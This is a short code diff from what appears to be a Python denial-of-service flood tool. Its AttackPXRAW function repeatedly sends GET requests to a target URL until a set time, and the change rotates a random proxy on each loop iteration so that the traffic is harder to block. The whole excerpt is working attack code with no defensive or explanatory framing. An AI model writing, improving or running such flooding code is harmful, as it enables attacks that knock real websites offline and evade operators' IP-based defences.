@@ -153,12 +153,12 @@ def LaunchPXRAW(url, th, t):
             pass
 
 def AttackPXRAW(url, until_datetime):
-    proxy = 'http://'+str(random.choice(list(proxies)))
-    proxy = {
-        'http': proxy,   
-        'https': proxy,
-    }
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        proxy = 'http://'+str(random.choice(list(proxies)))
+        proxy = {
+            'http': proxy,   
+            'https': proxy,
+        }
         try:
             requests.get(url, proxies=proxy)
             requests.get(url, proxies=proxy)
